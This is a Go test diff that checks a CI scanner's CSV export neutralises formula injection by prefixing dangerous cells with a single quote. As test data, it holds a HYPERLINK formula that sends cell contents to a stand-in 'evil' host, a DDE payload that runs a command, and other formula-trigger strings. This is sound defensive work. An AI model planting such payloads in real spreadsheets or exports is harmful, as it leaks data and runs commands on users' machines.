@@ -169,3 +169,93 @@ func TestBuildCSV_LineZeroIsEmptyString(t *testing.T) {
 		t.Errorf("line = %q, want empty string for zero-value Line", records[1][8])
 	}
 }
+
+// Findings carry values the scanned project controls (job names, and messages
+// that embed them), and the CSV is documented for opening in a spreadsheet, so
+// a cell starting with a formula trigger must be neutralized (CWE-1236).
+func TestBuildCSV_NeutralizesFormulaInjection(t *testing.T) {
+	entries := []control.ControlEntry{{ControlName: "actionsMustBePinnedByCommitSha", DisplayName: "Pin"}}
+	result := &control.AnalysisResult{
+		CiValid: true,
+		Findings: []opaengine.Finding{{
+			Code:    "ISSUE-701",
+			Message: `=HYPERLINK("http://evil/"&A2,"click")`,
+			Job:     `@SUM(1+1)`,
+			File:    "+ci.yml",
+		}},
+	}
+	records := buildCSV(entries, result)
+	row := records[1]
+	for _, i := range []int{5, 6, 7} { // message, context, file
+		if row[i] == "" {
+			continue
+		}
+		switch row[i][0] {
+		case '=', '+', '-', '@', '\t', '\r':
+			t.Errorf("cell %d = %q still starts with a formula trigger", i, row[i])
+		}
+	}
+	if row[5] != `'=HYPERLINK("http://evil/"&A2,"click")` {
+		t.Errorf("message = %q, want single-quote prefixed", row[5])
+	}
+}
+
+// Values that do not start with a trigger character must pass through
+// untouched, so normal data is unaffected for programmatic consumers.
+func TestBuildCSV_LeavesOrdinaryValuesUntouched(t *testing.T) {
+	entries := []control.ControlEntry{{ControlName: "actionsMustBePinnedByCommitSha", DisplayName: "Pin"}}
+	result := &control.AnalysisResult{
+		CiValid:  true,
+		Findings: []opaengine.Finding{{Code: "ISSUE-701", Message: "unpinned action", Job: "ci/build"}},
+	}
+	records := buildCSV(entries, result)
+	if records[1][5] != "unpinned action" || records[1][6] != "ci/build" {
+		t.Errorf("ordinary values were modified: %q / %q", records[1][5], records[1][6])
+	}
+}
+
+// One case per documented CSV-injection vector, so each stays closed. The
+// payloads are the forms a scanned project could put in a job name, which then
+// lands in the context column and, embedded, in the message.
+func TestCSVSafeCell_CoversEveryKnownVector(t *testing.T) {
+	dangerous := []struct {
+		name string
+		in   string
+	}{
+		{"equals formula", `=HYPERLINK("http://evil/"&A2,"click")`},
+		{"plus", "+1+1"},
+		{"minus", "-1+1"},
+		{"at sign DDE", `@SUM(1+1)`},
+		{"tab prefix", "\t=1+1"},
+		{"carriage return prefix", "\r=1+1"},
+		{"leading space then equals", " =1+1"},
+		{"several spaces then at", "   @SUM(1+1)"},
+		{"full-width equals", "＝HYPERLINK(\"http://evil\")"},
+		{"full-width plus", "＋1+1"},
+		{"full-width minus", "－1+1"},
+		{"full-width at", "＠SUM(1+1)"},
+		{"classic DDE payload", `=cmd|'/c calc'!A1`},
+	}
+	for _, tc := range dangerous {
+		t.Run(tc.name, func(t *testing.T) {
+			got := csvSafeCell(tc.in)
+			if got == tc.in {
+				t.Errorf("payload passed through unescaped: %q", tc.in)
+			}
+			if got != "'"+tc.in {
+				t.Errorf("got %q, want single-quote prefix on %q", got, tc.in)
+			}
+		})
+	}
+
+	safe := []string{
+		"", "ci/build", ".github/workflows/ci.yml", "unpinned action",
+		"https://example.com/x#L1", "ISSUE-701", "passed",
+		"  indented but harmless", "job (with parens)", "a-b-c",
+	}
+	for _, s := range safe {
+		if got := csvSafeCell(s); got != s {
+			t.Errorf("ordinary value was modified: %q -> %q", s, got)
+		}
+	}
+}
